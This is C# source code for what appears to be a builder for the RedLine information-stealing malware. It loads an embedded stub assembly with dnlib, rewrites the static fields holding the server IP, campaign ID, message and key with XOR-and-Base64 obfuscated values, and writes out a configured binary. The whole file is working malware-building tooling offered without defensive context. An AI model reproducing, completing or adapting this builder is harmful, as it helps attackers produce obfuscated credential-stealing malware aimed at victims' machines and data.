using System;
using System.Text;
using dnlib.DotNet;
using dnlib.DotNet.Emit;

namespace RedlineBuilder;

internal class Program
{
	private static string Xor(string input, string stringKey)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < input.Length; i++)
		{
			stringBuilder.AppendFormat("{0}", char.ConvertFromUtf32(input[i] ^ stringKey[i % stringKey.Length]));
		}
		return stringBuilder.ToString();
	}

	private static string ToBase64(string input)
	{
		return Convert.ToBase64String(Encoding.UTF8.GetBytes(input));
	}

	private static string EncryptString(string input, string key)
	{
		if (string.IsNullOrEmpty(input) || string.IsNullOrEmpty(key))
		{
			return input;
		}
		return ToBase64(Xor(ToBase64(input), key));
	}

	public static int Main(string[] args)
	{
		try
		{
			Arguments arguments = new Arguments(args);
			ModuleDefMD val = ModuleDefMD.Load(Resources.build, (ModuleCreationOptions)null);
			MethodDef val2 = val.ResolveTypeDef(31u).FindStaticConstructor();
			for (int i = 0; i < val2.Body.Instructions.Count; i++)
			{
				Instruction val3 = val2.Body.Instructions[i];
				if (val3.OpCode == OpCodes.Stsfld)
				{
					Instruction val4 = val2.Body.Instructions[i - 1];
					object operand = val3.Operand;
					switch (UTF8String.op_Implicit(((FieldDef)((operand is FieldDef) ? operand : null)).Name))
					{
					case "IP":
						val4.Operand = EncryptString(arguments.ip, arguments.key);
						break;
					case "ID":
						val4.Operand = EncryptString(arguments.id, arguments.key);
						break;
					case "Message":
						val4.Operand = EncryptString(arguments.message, arguments.key);
						break;
					case "Key":
						val4.Operand = arguments.key;
						break;
					case "Version":
						val4.OpCode = (arguments.byParts ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0);
						break;
					}
				}
			}
			((ModuleDef)val).Write(arguments.output);
			return 0;
		}
		catch
		{
			return -1;
		}
	}
}
